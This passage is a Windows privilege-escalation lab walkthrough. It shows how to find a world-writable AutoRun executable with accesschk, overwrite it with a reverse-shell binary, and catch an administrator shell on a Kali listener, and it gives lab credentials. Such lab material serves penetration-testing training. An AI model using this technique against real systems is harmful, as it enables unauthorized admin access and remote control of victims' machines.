Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:

```
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

Copy the reverse.exe executable you created and overwrite the AutoRun executableÂ with it:

```
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```

Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!
